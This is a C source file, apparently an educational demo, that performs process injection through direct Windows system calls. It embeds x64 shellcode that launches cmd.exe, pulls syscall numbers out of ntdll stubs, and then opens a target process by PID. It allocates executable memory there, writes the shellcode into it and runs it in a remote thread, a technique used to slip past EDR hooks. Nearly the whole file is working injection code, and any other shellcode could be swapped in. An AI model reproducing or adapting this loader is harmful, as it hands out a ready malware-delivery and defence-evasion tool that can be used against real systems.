/*
>* Direct Systemcalls *<

@author:  bekoo 
@website: 0xbekoo.github.io
@warning: This project has been developed for educational purposes only. Its use in real scenarios is at one's own risk. 

*/
#include "utils.h"


/*
    cmd.exe /K "echo Direct Systemcalls with bekoo"
*/
char Shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x4b\x20\x22\x65"
"\x63\x68\x6f\x20\x44\x69\x72\x65\x63\x74\x20\x53\x79\x73"
"\x74\x65\x6d\x63\x61\x6c\x6c\x73\x20\x77\x69\x74\x68\x20"
"\x62\x65\x6b\x6f\x6f\x22";
size_t  ShellcodeSize   = sizeof(Shellcode);

DWORD GetSSN(HMODULE ModuleName, LPCSTR ProcName) {
    printf("\n***** %s *****\n", ProcName);
    DWORD       sysCallNumber = 0;
    UINT_PTR    targetNtFunction;

    targetNtFunction = (UINT_PTR)GetProcAddress(ModuleName, ProcName);
    if (targetNtFunction == 0) {
        printf("%s handle retrieval failed Error Code: 0x%lx\n", ProcName, GetLastError());
        return -1;
    }

    sysCallNumber = ((PBYTE)(targetNtFunction + 0x4))[0];
    printf("SSN number for the %s successfully received! 0x%lx\n", ProcName, sysCallNumber);

    return sysCallNumber;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf(".\\injection.exe <PID>\n");
        return -1;
    }
    DWORD               PID                 = atoi(argv[1]);
    HANDLE              HandleProcess       = NULL;
    HANDLE              HandleThread        = NULL;
    HMODULE             ntDLL               = NULL;
    PVOID               RemoteBuffer        = NULL;
    size_t              BytesWritten        = 0;
    OBJECT_ATTRIBUTES   objAttr             = { sizeof(objAttr), NULL };
    CLIENT_ID           CID                 = { (HANDLE)PID, NULL };
    NTSTATUS            status              = 0;

    ntDLL = GetModuleHandleA("ntdll.dll");
    if (ntDLL == NULL) {
        printf("Failed to get handle to NTDLL. Error Code: 0x%lx\n", GetLastError());
        return -1;
    }

    NtOpenProcessSSN = GetSSN(ntDLL, "NtOpenProcess");
    status = NtOpenProcess(&HandleProcess, PROCESS_ALL_ACCESS, &objAttr, &CID);
    if (status != STATUS_SUCCESS) {
        printf("Failed to open handle to Process! Error Code: 0x%lx", status);
        return -1;
    }

    NtAllocateVirtualMemorySSN = GetSSN(ntDLL, "NtAllocateVirtualMemory");
    status = NtAllocateVirtualMemory(HandleProcess, &RemoteBuffer, 0, &ShellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        printf("Failed to Allocate Memory in Process! Error Code: 0x%lx", status);
        CloseHandle(HandleProcess);
        return -1;
    }

    NtWriteVirtualMemorySSN = GetSSN(ntDLL, "NtWriteVirtualMemory");
    status = NtWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), &BytesWritten);
    if (status != STATUS_SUCCESS || BytesWritten != sizeof(Shellcode)) {
        printf("Failed to Write Memory in Process! Error Code: 0x%lx", status);
        CloseHandle(HandleProcess);
        return -1;
    }

    NtCreateThreadExSSN = GetSSN(ntDLL, "NtCreateThreadEx");
    status = NtCreateThreadEx(&HandleThread, THREAD_ALL_ACCESS, NULL, HandleProcess, (RemoteBuffer), NULL, FALSE, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        printf("Failed to create thread! Error: 0x%p", status);
        CloseHandle(HandleProcess);
        return -1;
    }

    NtWaitForSingleObjectSSN = GetSSN(ntDLL, "NtWaitForSingleObject");
    NtWaitForSingleObject(HandleThread, FALSE, NULL);
}